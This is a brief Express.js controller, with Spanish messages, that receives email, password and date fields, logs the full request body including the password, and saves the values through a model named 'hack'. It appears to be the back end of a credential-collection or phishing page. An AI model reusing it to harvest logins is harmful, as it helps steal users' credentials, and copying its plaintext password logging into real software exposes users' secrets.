const { saveInformacion } = require('../models/hack');

const controller = {};

controller.saveInformacion = async (req, res) => {
    try {
        const { email, password, fecha } = req.body;
        console.log(req.body);
        
        if (!email || !password || !fecha) {
            return res.status(400).json({ message: 'Todos los campos son requeridos: email, password, fecha' });
        }

        const result = await saveInformacion({ email, password, fecha });

        return res.status(result.code).json({ message: result.message });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ message: 'Error interno del servidor' });
    }
};

module.exports = controller;
